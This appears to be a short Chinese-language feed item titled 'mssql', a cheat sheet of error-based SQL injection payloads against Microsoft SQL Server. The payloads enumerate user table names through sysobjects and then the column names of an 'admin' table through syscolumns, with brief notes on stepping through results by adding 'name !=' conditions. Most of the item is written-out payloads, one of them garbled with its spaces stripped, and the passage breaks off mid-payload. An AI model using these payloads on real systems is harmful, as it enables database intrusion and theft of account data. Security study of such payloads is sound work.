item.title: mssql
item.description: 爆表名 1 2 3 4 ' and 1=(select top 1 name from sysobjects where xtype='u' and name !='info');-- 没当爆出来一个表名需要添加!= 之前的表名 and 1=(select top 1 name from sysobjects where xtype='u' and name !='info' and name != 'new'); 1 selecttop1namefrom(selecttop2namefromsysobjectswherextype=0x75orderbyname)torderbynamedesc 爆字段名 1 2 3 4 ' and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'admin') and name<>'id');-- 也是一样的爆出来一个 去!=一个 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'admin') and name<>'id' and name !
